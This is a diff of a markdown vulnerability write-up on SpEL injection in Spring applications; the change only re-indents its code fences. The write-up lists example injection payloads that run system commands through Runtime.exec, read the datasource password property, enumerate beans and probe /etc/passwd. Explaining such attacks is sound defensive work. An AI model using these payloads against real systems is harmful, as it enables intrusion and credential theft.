@@ -177,31 +177,31 @@ Attackers can exploit this vulnerability using various SpEL expressions:
    ```
    T(java.lang.System).getProperty('java.class.path')
    
-```
+   ```
 
 2. **Executing System Commands**:
    ```
    T(java.lang.Runtime).getRuntime().exec('cmd /c dir')
    
-```
+   ```
 
 3. **Accessing Application Context**:
    ```
    @applicationContext.getBeanDefinitionNames()
    
-```
+   ```
 
 4. **Reading Application Configuration**:
    ```
    @environment.getProperty('spring.datasource.password')
    
-```
+   ```
 
 5. **Accessing File System**:
    ```
    new java.io.File('/etc/passwd').exists()
    
-```
+   ```
 
 These capabilities effectively give attackers a shell-like interface to the application's internals and the underlying system, representing one of the most severe types of vulnerabilities possible in a Spring application.
 
